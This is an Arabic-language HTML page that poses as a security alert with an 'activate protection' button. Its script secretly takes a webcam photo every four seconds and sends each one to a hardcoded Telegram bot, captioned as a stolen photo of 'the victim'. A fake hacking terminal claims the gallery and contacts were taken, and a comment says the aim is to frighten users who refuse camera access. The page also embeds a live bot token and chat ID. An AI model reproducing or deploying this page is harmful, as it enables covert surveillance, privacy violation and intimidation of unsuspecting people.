<!DOCTYPE html>
<html lang="ar">
<head>

    <style>
        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; text-align: center; }
        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
        .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.85); }
        .skull { font-size: 7px; line-height: 7px; white-space: pre; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; }
        .terminal { width: 90%; background: rgba(0,30,0,0.5); border: 1px solid #0f0; padding: 10px; font-size: 0.8rem; text-align: left; direction: ltr; max-height: 200px; overflow: hidden; }
        .btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; font-size: 1.2rem; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <div class="overlay" id="p1">
        <h1 style="color: red; animation: blink 0.8s infinite;">⚠️ SYSTEM BREACH ⚠️</h1>

        <button class="btn" onclick="start()">تـفـعـيـل الـحـمـايـة</button>

    <div class="overlay" id="p2" style="display:none">

               ______
            .-"      "-.

        <div class="terminal" id="term"></div>

    <script>
        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs';
        const ID = '7822309283';

        // تأثير الماتركس
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width / 20)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = "20px monospace";
            drops.forEach((y, i) => {
                const text = "01"[Math.floor(Math.random()*2)];
                ctx.fillText(text, i * 20, y * 20);
                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        async function start() {
            document.getElementById('p1').style.display = 'none';
            document.getElementById('p2').style.display = 'flex';
            runTerminal();
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                // يصور ويرسل كل 4 ثواني تلقائياً
                setInterval(capture, 4000);
            } catch (e) {
                // إذا رفض الكاميرا، نستمر في إرعابه بالكلام
            }
        }

        function capture() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'x.jpg');
                f.append('caption', '💀 VEXO: تم سحب صورة جديدة للضحية!');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg');
        }

        function runTerminal() {
            const lines = [
                "> Connecting to server...", "> Bypass firewall: OK", "> Accessing Gallery...",
                "> Downloading DCIM/Camera/...", "> Syncing contacts...", "> Capturing front_camera...",
                "> Success. Data sent to VEXO Server."
            ];
            let i = 0;
            const t = document.getElementById('term');
            setInterval(() => {
                if(i < lines.length) {
                    t.innerHTML += lines[i] + "<br>";
                    i++;
                }
            }, 1000);
        }
    </script>
